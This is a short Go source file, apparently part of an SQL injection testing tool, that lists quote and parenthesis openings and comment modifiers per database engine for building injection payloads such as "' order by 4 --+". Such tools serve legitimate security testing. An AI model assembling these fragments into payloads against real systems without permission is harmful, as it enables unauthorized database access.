package query

/*
' order by 4 --+
|      |      |
|      |      +-- Modifier
|      +--------- Payload
+---------------- Opening
*/

var Opening = map[string][]string{
	"PostgresSQL": {
		"",   // No opening
		"'",  // Single quote
		"''", // Escaped single quote
		")",  // Close parentheses
		"')", // Single quote + close parentheses
	},
	"MySQL": {
		"",   // No opening
		"'",  // Single quote
		"')", // Single quote + close parentheses
		"\"", // Double quote (less common but can occur)
	},
	"MsSQL": {
		"",   // No opening
		"'",  // Single quote
		"')", // Single quote + close parentheses
		"''", // Escaped single quote
	},
	"SQLite": {
		"",   // No opening
		"'",  // Single quote
		"')", // Single quote + close parentheses
	},
	"Default": {
		"",   // No opening
		"'",  // Single quote
		"''", // Escaped single quote
		")",  // Close parentheses
		"')", // Single quote + close parentheses
	},
}

var Ending = map[string][]string{
	"PostgresSQL": {},
	"MySQL":       {},
	"MsSQL":       {},
	"SQLite":      {},
	"Default":     {},
}

var Modifier = map[string][]string{
	"PostgresSQL": {
		"--",    // Single-line comment
		"--+",   // Single-line comment with space
		"/*",    // Start of a multi-line comment
		"/* */", // Multi-line comment
	},
	"MySQL": {
		"--",    // Single-line comment
		"--+",   // Single-line comment with space
		"#",     // MySQL-specific comment
		"/*",    // Start of a multi-line comment
		"/* */", // Multi-line comment
	},
	"MsSQL": {
		"--",    // Single-line comment
		"--+",   // Single-line comment with space
		"/*",    // Start of a multi-line comment
		"/* */", // Multi-line comment
	},
	"SQLite": {
		"--",    // Single-line comment
		"--+",   // Single-line comment with space
		"/*",    // Start of a multi-line comment
		"/* */", // Multi-line comment
	},
	"Default": {
		"--",    // Single-line comment
		"--+",   // Single-line comment with space
		"/*",    // Start of a multi-line comment
		"/* */", // Multi-line comment
	},
}
